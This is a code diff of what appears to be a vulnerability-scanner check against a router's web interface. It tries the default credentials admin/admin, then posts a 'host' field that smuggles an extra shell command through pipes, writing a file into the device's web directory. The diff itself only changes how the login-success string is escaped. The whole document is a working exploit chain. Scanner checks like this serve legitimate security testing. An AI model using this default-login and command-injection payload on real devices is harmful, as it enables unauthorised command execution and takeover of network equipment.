@@ -9,7 +9,7 @@ def audit(arg):
     post='user=admin&pass=admin'
     url=arg+'login/x'
     code, head, res, errcode, _ = curl.curl2(url,post=post)
-    if code==200 and '\u767b\u5f55\u6210\u529f' in res:
+    if code==200 and '\\u767b\\u5f55\\u6210\\u529f' in res:
         security_hole("weak password: admin admin")
         upload_url=arg+'Tools/ping_test/start'
         upload_post="host=www.baidu.com' | echo test_vul >/tmp/ikuai/www/resources/js/vul.js |/usr/ikuai/script/Ping start host='www.baidu.com&src=&count=10"
